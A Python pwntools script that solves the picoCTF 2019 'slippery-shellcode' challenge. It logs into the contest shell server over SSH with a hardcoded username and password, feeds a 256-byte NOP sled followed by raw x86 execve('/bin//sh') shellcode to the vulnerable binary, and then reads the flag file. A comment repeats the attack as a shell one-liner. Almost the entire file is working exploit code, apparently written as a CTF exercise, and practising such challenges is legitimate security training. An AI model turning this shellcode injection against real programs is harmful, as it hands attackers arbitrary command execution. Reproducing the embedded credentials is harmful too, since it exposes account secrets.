import pwn
import re

#cse3312@pico-2019-shell1:/problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0$ ( python -c "import pwn; print('\x90'*256 + pwn.asm(pwn.shellcraft.sh()))" ; cat ) | ./vuln
#Enter your shellcode:
#����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������jhh///sh/bin��h�4$ri1�QjY�Q��1�j

try:
    session = pwn.ssh(host='2019shell1.picoctf.com', user='cse331', password='3curityishard', level=50)
    p = session.process(cwd='/problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0', executable='./vuln')
    p.sendline('\x90'*256+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')
    p.sendlineafter('$ ', 'cat flag.txt')
    recvl = p.recv()

    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])
    p.close()
except:
    print('lost connection to server')
